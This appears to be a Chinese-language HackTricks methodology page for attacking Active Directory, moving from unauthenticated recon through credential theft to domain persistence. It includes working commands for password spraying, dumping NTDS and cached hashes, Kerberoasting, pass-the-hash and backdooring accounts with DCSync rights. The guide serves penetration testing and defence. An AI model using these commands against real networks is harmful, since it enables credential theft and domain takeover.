# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概览

**Active Directory** 是一项基础性技术，使 **网络管理员** 能够高效地在网络中创建和管理 **域**、**用户** 和 **对象**。它具有可伸缩性，便于将大量用户组织到可管理的 **组** 和 **子组** 中，并在不同层级上控制 **访问权限**。

**Active Directory** 的结构由三个主要层级组成：**域**、**树** 和 **林**。**域** 包含一组共享同一数据库的对象，例如 **用户** 或 **设备**。**树** 是由共享结构连接在一起的这些域的集合，而 **林** 则代表由多个树组成、通过 **信任关系** 互连的集合，构成组织结构的最上层。可以在这些层级的每一级上指定特定的 **访问** 和 **通信权利**。

Active Directory 的关键概念包括：

1. **目录** – 存放有关 Active Directory 对象的所有信息。
2. **对象** – 指目录中的实体，包括 **用户**、**组** 或 **共享文件夹**。
3. **域** – 用于容纳目录对象的容器，在一个 **林** 中可以存在多个域，每个域维护自己的对象集合。
4. **树** – 共享根域的域的分组。
5. **林** – Active Directory 中组织结构的顶层，由若干树组成，并在它们之间存在 **信任关系**。

**Active Directory Domain Services (AD DS)** 涵盖了一系列对集中式管理和网络内通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中存储数据并管理 **用户** 与 **域** 之间的交互，包括 **认证** 和 **搜索** 功能。
2. **Certificate Services** – 负责创建、分发和管理安全的 **数字证书**。
3. **Lightweight Directory Services** – 通过 **LDAP 协议** 支持启用目录的应用程序。
4. **Directory Federation Services** – 提供 **单点登录** 能力，使用户能够在一个会话中对多个 web 应用进行认证。
5. **Rights Management** – 通过控制版权材料的未授权分发和使用来协助保护版权内容。
6. **DNS Service** – 对域名解析至关重要。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos 认证**

要学习如何 **attack an AD**，你需要非常了解 **Kerberos 认证过程**。\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 速查表

你可以访问 https://wadcoms.github.io/ 快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos 通信执行动作时要求使用完全限定域名 (FQDN)。如果尝试通过 IP 地址访问机器，将使用 NTLM 而不是 Kerberos。

## Recon Active Directory（无凭据/会话）

如果你仅能访问 AD 环境但没有任何凭据/会话，你可以：

- **Pentest the network:**
- 扫描网络，发现机器和开放端口，尝试 **利用漏洞** 或 **从中提取凭据**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可能会提供域内关键服务器的信息，例如 web、打印机、共享、vpn、多媒体等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 获取有关如何执行此类工作的更多信息。
- **检查 smb 服务的 null 和 Guest 访问**（这在现代 Windows 版本上通常无效）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 关于如何枚举 SMB 服务的更详细指南可在此找到：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 关于如何枚举 LDAP 的更详细指南可在此找到（请**特别注意匿名访问**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 收集凭据：通过 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 冒充服务来获取凭据。
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问主机。
- 通过暴露 [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 收集凭据。
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从内部文档、社交媒体、域内的服务（主要是 web）以及公开可用的信息中提取用户名/姓名。
- 如果你找到了公司员工的全名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的命名约定有：_NameSurname_, _Name.Surname_, _NamSur_（每部分取 3 个字母），_Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 以及 3 个随机字母和 3 个随机数字（例如 abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **Anonymous SMB/LDAP enum:** 查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求的用户名无效时，服务器将使用 Kerberos 错误代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 进行响应，从而使我们能够确定该用户名无效。有效用户名将触发 AS-REP 响应中的 TGT，或返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要执行预认证。
- **No Authentication against MS-NRPC**: 在域控制器上对 MS-NRPC (Netlogon) 接口使用 auth-level = 1（无认证）。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在不提供任何凭据的情况下检查用户或计算机是否存在。工具 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 实现了此类枚举。相关研究见 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果在网络中发现了这些服务器，你也可以执行 **针对它进行用户枚举**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 和这个仓库 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) 找到用户名列表。
>
> 但是，你应该已经通过先前的 recon 步骤获得公司内部员工的**名字**。有了名字和姓氏，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 来生成潜在的有效用户名。

### Knowing one or several usernames

好，假设你已经知道了一个或多个有效用户名但没有密码……那么可以尝试：

- [**ASREPRoast**](asreproast.md)：如果某个用户**没有**属性 _DONT_REQ_PREAUTH_，你可以**请求一个 AS_REP message**，该消息会包含一些由该用户密码派生加密的数据。
- [**Password Spraying**](password-spraying.md)：对所有发现的用户尝试最常见的**密码**，也许有人在使用弱密码（注意密码策略！）。
- 注意你也可以**对 OWA 服务器进行喷洒**尝试，以获取对用户邮箱服务器的访问。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能能够通过对网络某些协议进行**poisoning**来**获取**一些可用于破解的挑战**hashes**：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已经成功枚举了 active directory，你会获得**更多的邮件地址并更好地理解网络**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 来获取对 AD 环境的访问。

### Steal NTLM Creds

如果你能以 **null 或 guest 用户** 访问其他 PC 或共享，你可以**放置文件**（例如 SCF 文件），当这些文件被访问时会触发对你的 NTLM 认证，从而让你**窃取**可用于破解的 **NTLM challenge**：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已拥有的每个 NT hash 视为针对其他更慢格式的候选密码，这些格式的密钥材料直接由 NT hash 派生。与其在 Kerberos RC4 票据、NetNTLM 挑战或缓存凭证中对长口令进行穷举，不如将 NT hashes 输入 Hashcat 的 NT-candidate 模式，让它在不知明文的情况下验证密码重用。在域被攻破后收集到成千上万的当前及历史 NT hashes 时，这种方法尤其有效。

在以下情况下使用 shucking：

- 你有来自 DCSync、SAM/SECURITY 转储或凭证库的 NT 语料，需要在其他域/forest 中测试重用。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM 响应或 DCC/DCC2 blob。
- 你想快速证明对长且不可破解口令的重用，并立即通过 Pass-the-Hash 进行横向移动。

该技术**不适用于**其密钥不是由 NT hash 派生的加密类型（例如 Kerberos etype 17/18 AES）。如果域只允许 AES，则必须回退到常规密码模式。

#### Building an NT hash corpus

- **DCSync/NTDS** – 使用 `secretsdump.py` 并包含历史记录以抓取尽可能多的 NT hashes（及其历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目会大幅扩展候选池，因为 Microsoft 可以为每个账户存储多达 24 个以前的 hash。关于更多获取 NTDS secrets 的方法见：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – 使用 `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz 的 `lsadump::sam /patch`）提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。去重并将这些 hashes 附加到同一个 `nt_candidates.txt` 列表中。
- **跟踪元数据** – 保留生成每个 hash 的用户名/域（即使字典只包含十六进制）。一旦 Hashcat 打印出成功候选，匹配的 hash 立即告诉你哪个主体在重用密码。
- 优先使用来自同一 forest 或受信任 forest 的候选；这将最大化 shucking 成功的可能性。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate 输入**必须保持原始的 32 十六进制 NT hashes**。禁用规则引擎（不要使用 `-r`，也不要使用混合模式），因为篡改会损坏候选密钥材料。
- 这些模式本身并不更快，但 NTLM 的密钥空间（在 M3 Max 上约 30,000 MH/s）比 Kerberos RC4（约 300 MH/s）快约 100×。用一个精心挑选的 NT 列表进行测试要远比在慢速格式中遍历整个密码空间便宜得多。
- 始终使用**最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是最近才加入的。
- 目前没有针对 AS-REQ Pre-Auth 的 NT 模式，且 AES etypes（19600/19700）需要明文密码，因为其密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而不是原始 NT hashes。

#### Example – Kerberoast RC4 (mode 35300)

1. 使用低权限用户为目标 SPN 捕获一个 RC4 TGS（详情见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 使用你的 NT 列表对票据进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT 候选派生 RC4 key 并验证 `$krb5tgs$23$...` blob。匹配意味着该服务账户使用了你已有的某个 NT hash。

3. 立即通过 PtH 横向移动：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

你也可以在之后选择用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文（如有需要）。

#### Example – Cached credentials (mode 31600)

1. 从被攻陷的工作站转储缓存的登录信息：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会得到一个已知的 NT hash，证明该缓存用户在重用密码。可直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）或在快速 NTLM 模式下离线爆破以恢复明文字符串。

针对 NetNTLM 挑战-响应（`-m 27000/27100`）和 DCC（`-m 31500`）同样适用相同的工作流程。一旦识别出匹配，你就可以发起中继、SMB/WMI/WinRM PtH，或使用掩码/规则离线重新破解 NT hash。



## Enumerating Active Directory WITH credentials/session

在此阶段，你需要**已攻破有效域账户的凭证或会话**。如果你拥有某些有效凭证或以域用户身份获得了 shell，**请记住之前提到的那些方法仍然可以用来攻破其他用户**。

在开始认证枚举之前，你应该了解 **Kerberos double hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

攻破一个账号是**开始攻破整个域**的重要一步，因为你将能够开始进行 **Active Directory Enumeration：**

关于 [**ASREPRoast**](asreproast.md) 你现在可以查找所有可能的易受攻击用户；关于 [**Password Spraying**](password-spraying.md) 你可以获得**所有用户名的列表**并尝试使用被攻破账户的密码、空密码或其他有希望的新密码。

- 你可以使用 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)，这通常更隐蔽
- 你也可以 [**use powerview**](../basic-powershell-for-pentesters/powerview.md) 来提取更详细的信息
- 另一个用于 Active Directory Recon 的强大工具是 [**BloodHound**](bloodhound.md)。它通常**不太隐蔽**（取决于你使用的收集方法），但**如果你不在乎被发现**，强烈推荐尝试。查找用户可以 RDP 到哪里、查找到其他组的路径等。
- **其他自动化 AD 枚举工具有：** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**。**
- 查看 [**AD 的 DNS 记录**](ad-dns-records.md)，因为它们可能包含有价值的信息。
- 一个可以用于枚举目录的 GUI 工具是来自 **SysInternal** Suite 的 **AdExplorer.exe**。
- 你也可以使用 **ldapsearch** 在 LDAP 数据库中搜索字段 _userPassword_ & _unixUserPassword_，甚至在 _Description_ 字段中寻找凭证。参见 PayloadsAllTheThings 上的 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) 了解其他方法。
- 如果你使用 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 来枚举域。
- 你还可以尝试以下自动化工具：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 很容易获取所有域用户名（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 上，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即使这个 Enumeration 部分看起来很短，但它是所有步骤中最重要的部分。访问这些链接（主要是 CMD、powershell、powerview 和 BloodHound），学习如何枚举域并反复练习直到熟练。在一次评估中，这将是你找到通往 DA 的关键时刻，或判断无法继续的决定点。

### Kerberoast

Kerberoasting 涉及获取由与用户账户关联的服务使用的 **TGS tickets** 并离线破解它们的加密 —— 该加密基于用户密码。

更多详情见：


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

一旦你获得了一些凭证，可以检查是否能访问任何一台**机器**。为此，你可以使用 **CrackMapExec** 根据端口扫描结果尝试用不同协议连接多台服务器。

### Local Privilege Escalation

如果你以普通域用户的身份获得了凭证或会话，并且以该用户对域内的某台**机器**有**访问**权限，你应尝试在本地提权并搜集凭证。只有获得本地管理员权限，你才能**转储内存中的其他用户哈希**（LSASS）或本地（SAM）。

本书中有一整章关于 [**Windows 本地提权**](../windows-local-privilege-escalation/index.html) 和一份 [**检查清单**](../checklist-windows-privilege-escalation.md)。另外，不要忘记使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

在当前用户会话中找到能让你访问意外资源的 **tickets** 的可能性非常**小**，但你仍然可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

如果你已经能够枚举 active directory，你会获得 **更多的电子邮件和更好地理解网络的能力**。你可能能够强制执行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### 在 Computer Shares | SMB Shares 中查找 Creds

现在你有了一些基本凭证，你应该检查是否能**找到**任何**在 AD 内共享的有趣文件**。你可以手动做这件事，但这非常无聊且重复（如果你发现数百份需要检查的文档就更糟）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你能**访问其他 PCs 或 shares**，你可以**放置文件**（比如 SCF file），如果这些文件以某种方式被访问就会 t**rigger an NTLM authentication against you**，这样你可以**窃取**该**NTLM challenge**来破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

该漏洞允许任何经过认证的用户**compromise the domain controller**。


{{#ref}}
printnightmare.md
{{#endref}}

## 在 Active Directory 上使用特权凭证/会话进行权限提升

**对于下列技术，普通域用户不足以执行，你需要一些特殊特权/凭证才能进行这些攻击。**

### Hash extraction

希望你已经设法**compromise some local admin**账号，方法包括 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[escalating privileges locally](../windows-local-privilege-escalation/index.html)。\
接下来，就该在内存和本地转储所有哈希了。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你拥有某个用户的 hash**，你就可以用它来**impersonate**该用户。\
你需要使用某个**tool**来**使用该 hash 执行 NTLM authentication**，**或者**你可以创建一个新的 **sessionlogon** 并将该 **hash** 注入到 **LSASS** 中，这样当任何 **NTLM authentication** 被执行时，就会使用该 **hash。** 最后一种选项正是 mimikatz 所做的。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

该攻击旨在**使用用户 NTLM hash 来请求 Kerberos 票据**，作为常见的 Pass The Hash 通过 NTLM 协议的替代。因此，这在 NTLM 协议被禁用、仅允许 Kerberos 作为认证协议的网络中尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者**窃取用户的身份验证票据**，而不是他们的密码或 hash 值。被窃取的票据随后被用来**impersonate the user**，从而在网络内获得对资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有某个 **local administrator** 的 **hash** 或 **password**，你应该尝试使用它在其他 **PCs** 上**本地登录**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 注意这会相当**嘈杂**，并且 **LAPS** 可以**缓解**它。

### MSSQL Abuse & Trusted Links

如果用户有权限**访问 MSSQL 实例**，他可能能够利用它在 MSSQL 主机上**执行命令**（如果以 SA 身份运行）、**窃取** NetNTLM **hash** 或者甚至进行 **relay** **attack**。\
此外，如果某个 MSSQL 实例被另一个 MSSQL 实例信任（database link），并且该用户在被信任的数据库上有权限，他将能够**利用信任关系在另一个实例上执行查询**。这些信任可以被串联，最终用户可能找到一个配置错误的数据库并在那里执行命令。\
**数据库之间的链接甚至可以跨越 forest trusts。**

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方的资产清点和部署套件通常会暴露获取凭证和代码执行的强大路径。见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现任何 Computer 对象具有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 并且你在该计算机上拥有域权限，你将能够从所有登录到该计算机的用户的内存中转储 TGTs。\
因此，如果 **Domain Admin 登录到该计算机**，你将能够转储他的 TGT 并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以**自动妥协一个 Print Server**（希望它是 DC）。

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许进行 "Constrained Delegation"，它将能够**代表任何用户去访问该计算机上的某些服务**。\
然后，如果你**窃取该用户/计算机的 hash**，你将能够**代表任何用户**（甚至 domain admins）去访问某些服务。

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

在远程计算机的 Active Directory 对象上拥有 **WRITE** 权限可以使你获得带有**提升权限**的代码执行：

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被攻破的用户可能对某些域对象拥有一些**有趣的权限**，这些权限可能让你在后续进行横向移动/**权限提升**。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

在域内发现**Spool 服务在监听**可以被**滥用**以**获取新凭证**并**提升权限**。

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果**其他用户**访问**被攻破的**机器，就有可能**从内存中收集凭证**，甚至**向他们的进程注入 beacons**来冒充他们。\
通常用户会通过 RDP 访问系统，下面是如何对第三方 RDP 会话执行几种攻击的方法：

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一个管理域连接计算机上**本地 Administrator 密码**的系统，确保其**随机化**、唯一且经常**更改**。这些密码存储在 Active Directory 中，访问通过 ACL 仅限于被授权的用户。拥有足够权限访问这些密码时，就可以向其他计算机 pivot。

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**从被攻破的机器收集证书**可能是提升环境内权限的一种方法：

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了**易受攻击的 templates**，就可能滥用它们来提升权限：

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦你获得 **Domain Admin** 或更好的 **Enterprise Admin** 权限，你可以**转储**域数据库：_ntds.dit_。

[**有关 DCSync 攻击的更多信息请见此处**](dcsync.md)。

[**有关如何窃取 NTDS.dit 的更多信息请见此处**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前面讨论的一些技术可以用于持久化。\
例如你可以：

- 让用户对 [**Kerberoast**](kerberoast.md) 易受攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 让用户对 [**ASREPRoast**](asreproast.md) 易受攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 利用 **NTLM hash**（例如 **PC 账户的 hash**）为特定服务创建一个**合法的 Ticket Granting Service (TGS) ticket**。该方法用于**访问服务的权限**。

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 涉及攻击者获得 Active Directory 环境中 **krbtgt 账户的 NTLM hash**。该账户用于签署所有 **Ticket Granting Tickets (TGTs)**，这些票据对在 AD 网络中进行身份验证至关重要。

一旦攻击者获得此 hash，他们就可以为任意账户创建 **TGTs**（即 Silver ticket 攻击的原理）。

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这些类似于 golden tickets，但伪造方式可以**绕过常见的 golden tickets 检测机制**。

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有账户的证书或能够请求证书**是保持用户账户持久化的非常有效的方法（即使该用户更改密码也有效）：

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限维持持久化：**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过对这些特权组（如 Domain Admins 和 Enterprise Admins）应用统一的 **Access Control List (ACL)** 来确保存取安全，从而防止未授权更改。然而，此功能也可被利用；如果攻击者修改 AdminSDHolder 的 ACL，给予普通用户完全访问权限，该用户就会对所有特权组获得广泛控制。这个为保护而生的安全措施在未经严格监控时可能适得其反，导致不当访问。

[**有关 AdminDSHolder Group 的更多信息见此处。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每台 **Domain Controller (DC)** 内都存在一个**本地管理员**账户。通过在此类机器上获得管理员权限，可以使用 **mimikatz** 提取本地 Administrator 的 hash。之后需要修改注册表以**启用使用此密码**，从而允许远程访问本地 Administrator 账户。

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以**赋予**某个**用户**对某些特定域对象的**特殊权限**，以便在未来让该用户**提升权限**。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于**存储**对象对另一个对象的**权限**。如果你能对对象的 **security descriptor** 做出一丁点的更改，就可以在不成为某个特权组成员的情况下获得对该对象的非常有价值的权限。

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

在内存中修改 **LSASS** 以建立一个**通用密码**，从而获取对所有域账户的访问。

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[在此了解什么是 SSP (Security Support Provider)。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建你自己的 **SSP** 来**以明文捕获**用于访问机器的 **凭证**。

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它在 AD 中注册一个**新的域控制器**并利用它在指定对象上**推送属性**（如 SIDHistory、SPNs...），在**不留下修改日志**的情况下完成。你**需要 DA** 权限并位于**根域**内。\
注意如果你使用了错误的数据，会产生相当丑陋的日志。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前面我们讨论了如果你有**足够权限读取 LAPS 密码**，如何提升权限。然而，这些密码也可以用于**维持持久化**。\
参见：

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着**入侵单个域可能导致整个 Forest 被攻破**。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许一个**域**的用户访问另一个**域**中的资源。它实质上在两个域的认证系统之间建立了一种链接，允许认证验证在两域之间流动。当域建立信任时，它们会在各自的 **Domain Controllers (DCs)** 中交换并保留特定的**密钥**，这些密钥对信任的完整性至关重要。

在典型场景中，如果用户打算访问**受信任域**中的某项服务，他们必须先向自己域的 DC 请求一个称为 **inter-realm TGT** 的特殊票据。该 TGT 使用两个域之间约定的共享**密钥**进行加密。用户随后将此 TGT 提交给**受信任域的 DC**以获取服务票据（**TGS**）。受信任域的 DC 验证 inter-realm TGT，若验证通过，则为用户所需访问的 Domain 2 中的服务器签发 TGS，从而允许用户访问该服务。

**步骤**：

